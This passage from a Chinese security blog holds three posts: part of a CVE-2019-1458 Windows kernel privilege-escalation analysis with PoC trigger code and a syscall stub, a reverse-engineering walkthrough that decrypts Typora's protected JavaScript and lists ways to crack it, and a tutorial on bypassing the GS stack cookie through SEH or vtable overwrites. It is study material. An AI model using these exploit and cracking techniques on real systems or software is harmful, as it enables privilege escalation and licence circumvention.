class="string">L&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering dereference of wnd-&gt;extraData by calling NtUserMessageCall second time&quot;</span>);</span><br><span class="line">    NtUserMessageCall(sploitWnd, WM_ERASEBKGND, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_DATA SEGMENT</span><br><span class="line">_DATA ENDS</span><br><span class="line">_TEXT SEGMENT</span><br><span class="line"></span><br><span class="line">PUBLIC NtUserMessageCall</span><br><span class="line">NtUserMessageCall PROC</span><br><span class="line">    mov r10, rcx</span><br><span class="line">    mov eax, 1007h      ; Win7 sp1</span><br><span class="line">    syscall</span><br><span class="line">    ret</span><br><span class="line">NtUserMessageCall ENDP</span><br><span class="line">_TEXT ENDS</span><br><span class="line">END</span><br></pre></td></tr></table></figure>



<p>将项目配置属性为<strong>DEDUG</strong>，并且设置**项目属性-配置属性-C/C+±代码生成-运行库-多线程调试(/MTd)**。先运行程序，然后在windbg打开源文件，然后输入<code>!process 0 0</code>命令</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220803102213759.png" alt="image-20220803102213759"></p>
<p>然后输入<code>.process /i /r /p 进程内核对象地址</code>,WinDBG显示继续执行需要输入g，输入g，回车</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220803104226511.png" alt="image-20220803104226511"></p>
<p>输入<code>.reload /f /user</code>重载用户层模块符号，在关键的地方下断点。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220803161726850.png" alt="image-20220803161726850"></p>
<p>在<code>xxx</code>函数运行该条指令后，<code>tagWND-&gt;fnid</code>已经修改为0x2a0</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220803162348396.png" alt="image-20220803162348396"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220803162440758.png" alt="image-20220803162440758"></p>
<p>第二次调用<code>NtUserMessageCall</code>的时候。经过前面的分析会进行一些if判断。下图中就是前面代码第7行的判断。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220803164631884.png" alt="image-20220803164631884"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220803170041610.png" alt="image-20220803170041610"></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>该漏洞主要是未正确初始化<code>*(gpsi+0x154)</code>变量。</p>
<p><code>gpsi</code>是一个全局指针指向<code>tagSERVERINFO</code>结构。这个结构描述了系统窗口(意味着菜单，桌面，切换等等)。这些窗口通过FNID值进行识别，例如 <code>0x2A0</code> 代表着切换窗口。并且这允许用户空间应用程序在任务切换窗口中设置额外的窗口数据</p>
<p>当使用<code>RegisterClassEx</code>注册窗口时，我们有机会在<code>WNDCLASSEX</code>上指定<code>cbWndExtra</code> 字段，该字段描述了除<code>tagWND</code>结构外还将分配多少字节的额外数据，以储存窗口的额外信息。然后，我们可以通过调用<code>SetWindowLongPtr</code>函数修改这些额外的字节。这个额外的字节是一个指针，所以可以解引用来实现任意地址写。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458458572&idx=1&sn=be165db07a411d492fd227c006a66cf6&chksm=b18e294686f9a050d7fab03d070e4b37c1012a93750e00774bfd8ae810ac7c2f384bad083896&scene=21#wechat_redirect">CVE-2019-1458提权漏洞学习笔记</a></p>
<p>​                    <a target="_blank" rel="noopener" href="https://github.com/piotrflorczyk/cve-2019-1458_POC">https://github.com/piotrflorczyk/cve-2019-1458_POC</a></p>
<p>​                    <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41252520/article/details/120308729">CVE-2019-1458 分析</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/07/20/sample/typora%E9%80%86%E5%90%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/20/sample/typora%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">Typora逆向</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-20 00:00:00" itemprop="dateCreated datePublished" datetime="2022-07-20T00:00:00+08:00">2022-07-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-21 17:28:58" itemprop="dateModified" datetime="2022-07-21T17:28:58+08:00">2022-07-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="文件格式分析"><a href="#文件格式分析" class="headerlink" title="文件格式分析"></a>文件格式分析</h3><p>Typora采用的是electron框架构建跨平台桌面应用。从实现方式上来说，其本质还是基于chrome内核的html、js、css构成的应用。</p>
<p>electron打包的项目，最常见的就是 <code>asar</code> 格式的私有编码文件，里面包含文件名、大小、内容偏移量等数据，<strong>按文件头部的 json内容 解析即可提取出所有文件。</strong></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220720142337810.png" alt="image-20220720142337810"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220720143042743.png" alt="image-20220720143042743"></p>
<p>工具查看</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220720143450494.png" alt="image-20220720143450494"></p>
<p>在github上有<a target="_blank" rel="noopener" href="https://github.com/toyobayashi/electron-asar-encrypt-demo">一个项目</a>讲到关于electron（该方案可以把启动文件编译为node二进制文件，作为启动入口，来保护薄弱的js代码。在项目启动时，将加密后的代码进行解密，交回electron流程进行执行，<strong>从而避免上面说的直接解包拿到源代码的可能。</strong>）</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220720145218070.png" alt="image-20220720145218070"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220720160414013.png" alt="image-20220720160414013"></p>
<p><code>main</code>属性就是 electron 项目启动的主入口。 把 <code>main.node</code> 拖到ida中, 分析执行流程。</p>
<h3 id="IDA分析主入口"><a href="#IDA分析主入口" class="headerlink" title="IDA分析主入口"></a>IDA分析主入口</h3><p>啊这拖进去就是个dll啊</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721142800220.png" alt="image-20220721142800220"></p>
<p>根据前面分析的，<code>main.node</code>(.node 文件是 c/c++ 写的扩展文件)是负责解密的，先直接用插件看一下用了什么加密方法</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220720164134883.png" alt="image-20220720164134883"></p>
<p>采用的是AES对称加密算法，解密采用的是第三个常量数组。交叉引用看一下</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721142839196.png" alt="image-20220721142839196"></p>
<p>注意到这里，推测这里就是先加载<code>app.asar</code>的内容，然后调用<code>sub_180003E40</code>进行解密</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721143250799.png" alt="image-20220721143250799"></p>
<p>主要看一下<code>sub_180003E40</code>函数，查阅一下资料可知，<code>napi_create_string_utf8</code>函数目的是生成一个base64编码的字符串，结果存储在最后一个参数。<code>napi_get_named_property</code>函数是从第二个参数中检索第三个参数的属性名称，获得的该属性的值存放在第四个参数。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721144404863.png" alt="image-20220721144404863"></p>
<p>主要看下面这部分AES解密，要么找到解密后的缓冲区，要么找到密钥，然后判断教秘方式进行解密。第一种方式要简单一点（因为加密算法不太会）。</p>
<h3 id="分析流程获取解密后的缓冲区"><a href="#分析流程获取解密后的缓冲区" class="headerlink" title="分析流程获取解密后的缓冲区"></a>分析流程获取解密后的缓冲区</h3><p><code>napi_call_function</code>函数第三个参数就是要调用的函数，第五个参数是参数数组。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721153437504.png" alt="image-20220721153437504"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721145500979.png" alt="image-20220721145500979"></p>
<p>动态调试一下，下一个dll断点（note：注意选择调试-高级-隐藏PEB以及忽略所有异常，因为有反调试）</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721150921124.png" alt="image-20220721150921124"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721145735259.png" alt="image-20220721145735259"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721150804855.png" alt="image-20220721150804855"></p>
<p>再通过IDA查看函数偏移</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721150231522.png" alt="image-20220721150231522"></p>
<p>定位函数位置</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721151136852.png" alt="image-20220721151136852"></p>
<p>我们知道64位程序调用约定是 rcx rdx r8 r9，超过四个通过栈传递，前面分析v27 = *(a3 + 8)，a3也就是r8存储的内容</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721152336879.png" alt="image-20220721152336879"></p>
<p>选择在转储中跟随右下角圈出来的地方，可以看到buffer.from的两个参数。最后没懂这里的操作，查看博客发现这个参数没有发生改变，后续也没有调用相关数据结构，继续往下看AES解密部分，解密首先肯定得获得密文缓冲区。</p>
<p>可以看到申请了32个字节的内存给v32，然后<code>sub_18000B060</code>对v32和v46今次了操作，v32应该是目标地址，第三个参数是大小，v46就是源地址了。这个函数进去发现是一大堆运算，估计是对v46的一些解密或者hash之类的操作。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721154913867.png" alt="image-20220721154913867"></p>
<p>可以看到<code>sub_180007000</code>函数对上一步通过v46得到的v32数据与v10数据进行操作，然后放到v45数组中（感觉应该是密钥，这么复杂应该是为了保护密钥吧），在这个函数中调用了<code>sub_180007800</code>，这个函数对自己的PE文件进行了一些操作，感觉不是很重要，往下看看。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721155431157.png" alt="image-20220721155431157"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721155356220.png" alt="image-20220721155356220"></p>
<p>接下来分析一下<code>sub_180005c00</code>函数，前面分析的密文地址应该就是在v27中，这个函数主要看它的返回值有什么用。</p>
<p>下面这段汇编的意思是，返回值存储在rax中，将<code>*（rax+8）</code>的内容给r14，然后减去<code>*rax</code>，得到一个<code>size</code>。或许说这两个值是密文开始与结束地址？</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721161853372.png" alt="image-20220721161853372"></p>
<p>可以看到用前面得到的size申请了一块<code>Block</code>，函数<code>sub_18000B060</code>对*v12进行操作，存储在<code>Block</code>中。v12就是前面说的rax。所以分析到这里知道了，v12为密文开始地址，v13为密文大小。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721162241819.png" alt="image-20220721162241819"></p>
<p>以<code>v13 + 1</code> 的大小 申请了一块内存 v14 ， <code>sub_18000B060 </code>对 Block 再次进行操作， 结果放到v14，v14的最后一个字节置为0 ，推测已经把密文转换为字符串了 ， 需要一个 NULL 结尾。<code>v15 = v14[v13-1]</code> , 也就是从v14中取了一个字节的值 ，位置在null字符的前一字节。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721163753782.png" alt="image-20220721163753782"></p>
<p>关注一下上面的<code>sub_180006AC0</code>函数，这个函数是我们从解密数组一步步交叉引用找到的函数，v45是<code>sub_180007000</code>函数对上一步通过v46得到的v32数据与v10数据进行操作得到的。(下面是<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272538.htm#msg_header_h1_3">这位大佬分析的</a>)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_int64 __fastcall <span class="title">sub_180006AC0</span><span class="params">(v45,block,block_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ( block_size )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = block;</span><br><span class="line">    v5 = v45 + <span class="number">0xF0</span> - (_QWORD)block;           <span class="comment">//v45+0xF0的地址  减去  block的地址得到v5</span></span><br><span class="line">    v6 = ((block_size - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;          <span class="comment">//做为外圈循环的次数</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *v3;             </span><br><span class="line">     <span class="comment">//v7为 xmmword 16字节浮点寄存器 ，把block的内容取16字节给v7  16字节符合AES块大小 </span></span><br><span class="line">     <span class="comment">//由此推测block是真正的密文，将在这个函数中进行解密操作</span></span><br><span class="line"> </span><br><span class="line">      sub_180007320(v3, v45);    <span class="comment">//用到了AES解密常量  应该是解密相关  并且对推测的key  也就是前32字节有一些操作</span></span><br><span class="line">      v8 = <span class="number">16</span>i64;                <span class="comment">//内圈循环16次</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = *((<span class="keyword">char</span>*)(v3 + v5));       <span class="comment">//block地址 + v5偏移  取一个字节内容</span></span><br><span class="line">        *(<span class="keyword">char</span>*)v3 ^= result;               <span class="comment">//取block的1字节数据，与block地址 + v5偏移  进行异或</span></span><br><span class="line">        v3 = (__int128 *)((<span class="keyword">char</span> *)v3 + <span class="number">1</span>);  <span class="comment">//block += 1</span></span><br><span class="line">        --v8;                                <span class="comment">//总共16次 也就是16个字节异或</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 );</span><br><span class="line">      v5 -= <span class="number">16</span>i64;                          <span class="comment">//外圈循环  v5 每次-16  也就是每次异或 异或的值都会变化 范围为-16字节</span></span><br><span class="line">      v45 + <span class="number">0xF0</span> = v7;                        <span class="comment">//block的16字节内容  给到v45+0xF0</span></span><br><span class="line">      --v6;                                    <span class="comment">//外圈循环次数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="得到解密后数据"><a href="#得到解密后数据" class="headerlink" title="得到解密后数据"></a>得到解密后数据</h3><p>来到调用解密函数的函数，只需要在彻底解密后，送到JS引擎执行的时候，拿到解密的JS代码即可。解密后返回了一个值，这个值作为了调用JS函数的参数</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721165140509.png" alt="image-20220721165140509"></p>
<p>在x64dbg中调试，查看第五个参数也就是<code>rsp+20</code>的位置。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721165400986.png" alt="image-20220721165400986"></p>
<p>一步步在转储中跟随，最后得到了解密后unicode形式的JS代码</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220721165843391.png" alt="image-20220721165843391"></p>
<h3 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h3><p><code>main.node</code>模块是运行起来后加载的模块。其实要破解的思路就是修改JS代码，修改判断逻辑。下面介绍的几种方法都是为了修改JS代码服务的。</p>
<blockquote>
<p>1.调试器加载：在模块加载通知中断下，定位到解密函数下断，修改内存中的JS代码</p>
<p>2.导出表hook：参考进程替换（傀儡进程）技术，创建进程后挂起，由于main.node中的node api是使用框架中的导出api，所以可以替换导出函数为自己的函数，在调用时进行参数判断，如果为JS代码，则修改。</p>
<p>3.Dll劫持：替换main.node，由自己加载真正的main.node并调用，调用时，定位到解密函数并hook，等待JS代码并修改。</p>
<p>4.PE代码注入： 修改框架的PE文件，并加载自己的DLL，加载后进行导出表hook。</p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结一下分析思路：框架会加载解密模块<code>main.node</code>，解密模块对<code>app.asar</code>进行解密，然后将解密的代码送入JS引擎执行。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/07/19/Cheese_point/GS%E7%BB%95%E8%BF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/19/Cheese_point/GS%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">GS绕过</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-07-19 00:00:00 / 修改时间：20:16:59" itemprop="dateCreated datePublished" datetime="2022-07-19T00:00:00+08:00">2022-07-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">知识点补充学习</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="GS原理"><a href="#GS原理" class="headerlink" title="GS原理"></a>GS原理</h3><p>GS功能是Windows 针对栈溢出而产生得防御技术。<strong>其主要原理是在调用函数初始化一个栈帧之后将一个随机数放入栈当中，并且在“.data“节区保存一个副本。每次在执行返回地址得指令之前都需要验证一下随机值。如果发生变化，则认为产生溢出。</strong></p>
<p>向栈内压入一个随机的DWORD值，这个随机数被称为canary ，IDA分析中为 Security Cookie。Security Cookie 位于 EBP 之前，系统还将在.data的内存区域中存放一个 Security Cookie的副本（如下图，图片来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43742894/article/details/105800072">该博客</a>）</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220719160609079.png" alt="image-20220719160609079"></p>
<p><strong>Security Cookie的生成</strong></p>
<ul>
<li>系统以data节的第一个 DWORD值作为Cookie种子，或称为原始Cookie（所有函数的Cookie都用它生成）</li>
<li>程序每次运行，种子都不同，具有很强的随机性</li>
<li>在栈帧初始化以后，用ebp xor 种子 ，作为当前函数的Cookie，以此作为不同函数的区别，并增加随机性</li>
<li>函数返回前，用ebp 还原出 Cookie 种子 ，进行比较</li>
</ul>
<p><strong>注意事项：</strong><br>因为额外的数据和操作带来的直接后果就是系统性能的下降，为了将对性能的影响降到最<br>小，编译器在编译程序的时候并不是对所有的函数都应用 GS，以下情况不会应用 GS。</p>
<ul>
<li>函数不包含缓冲区。 (就不会有栈溢出)</li>
<li>函数被定义为具有变量参数列表。</li>
<li>函数使用无保护的关键字标记。</li>
<li>函数在第一个语句中包含内嵌汇编代码。</li>
<li>缓冲区不是 8 字节类型且大小不大于 4 个字节。</li>
</ul>
<h3 id="IDA逆向分析GS"><a href="#IDA逆向分析GS" class="headerlink" title="IDA逆向分析GS"></a>IDA逆向分析GS</h3><p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220719161335393.png" alt="image-20220719161335393"></p>
<p>生成exe后分析，可以看到，把安全cookie给rax， 与 rsp异或后， 放入栈中rsp+0x90的位置 ，然后再去函数末尾看一下</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220719162615666.png" alt="image-20220719162615666"></p>
<p>可以看到，在printf调用后， 把栈中的 cookie拿出来给rcx ， rcx与rsp异或后， 调用了一个检查函数</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220719163211608.png" alt="image-20220719163211608"></p>
<p>先把结果与.data节中的原始 cookie进行比较 ，其中主要处理函数是<code>sub_1400013cc</code></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220719163603028.png" alt="image-20220719163603028"></p>
<p>调用系统自己的异常处理函数，并传入之前的<code>ExceptionInfo</code>，之后获取当前进程后强制结束</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220719164427150.png" alt="image-20220719164427150"></p>
<h3 id="绕过GS"><a href="#绕过GS" class="headerlink" title="绕过GS"></a>绕过GS</h3><p>可以有以下几种方式，这里试着实践一下2,3两点</p>
<ul>
<li>利用未被保护的内存突破GS</li>
<li>覆盖虚函数突破GS</li>
<li>攻击SEH突破GS</li>
<li>同时替换栈中和.data中的Cookie突破GS（硬刚覆盖返回地址）</li>
</ul>
<h4 id="攻击SEH"><a href="#攻击SEH" class="headerlink" title="攻击SEH"></a>攻击SEH</h4><p>复习一下SEH的知识</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220719180756855.png" alt="image-20220719180756855"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220719180832894.png" alt="image-20220719180832894"></p>
<blockquote>
<p>SEH的链表结构如上所示， Next代表下一个SEH结构 ，Handler 代表本函数内的异常处理例程</p>
<p>SEH是<strong>以函数为单位</strong>，也就是一个函数只能有一个SEH结构，如果本函数内的异常处理例程没有处理这个异常，则去寻找Next记录的下一个SEH结构，如果最后都没有处理，就交给系统的默认异常处理</p>
<p>系统的默认异常处理， Next 为FFFFFFFF ， Handler 为系统默认处理例程，也就是会给你弹一个框，并结束进程</p>
<p>SEH会在函数入口注册，函数出口注销，会出现有关fs:[0]的操作 ， 简单点说就是把上述的SEH记录指向自己在栈中的SEH结构，然后自己再指向原来的SEH结构</p>
</blockquote>
<p>1.写一个测试函数： test是一个溢出函数且注册了SEH ， 把buf1 的 500字节的数据 放入 test函数中的200字节大小的缓冲区中， 此时会造成溢出，溢出后会覆盖到 out 的地址（参数地址 ebp + n），然后再次拷贝buf到out 的过程中 ， <strong>会触发非法访问，转入异常处理流程</strong>，但是此时函数并没有执行到返回，也就是没有执行到 check cookie函数， 所以可以覆盖SEH来实现绕过 GS（因此我们可以通过**(pop pop ret)**覆盖SEH来达到溢出的目的。但对于受SafeSEH保护的模块，就可能会导致exploit失效）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">test</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">char</span>* out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">200</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, str);</span><br><span class="line">        <span class="built_in">strcpy</span>(out, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error OverFlow\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> arc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">500</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf1, <span class="number">0x90</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf2[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    test(buf1, buf2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击虚函数"><a href="#攻击虚函数" class="headerlink" title="攻击虚函数"></a>攻击虚函数</h4><p>堆栈布局：【局部变量】【cookie】【入栈寄存器】【返回地址】【参数】【虚表指针】<br>当把虚表指针覆盖后，由于要执行虚函数得通过虚表指针来搜索，即可借此劫持EIP</p>
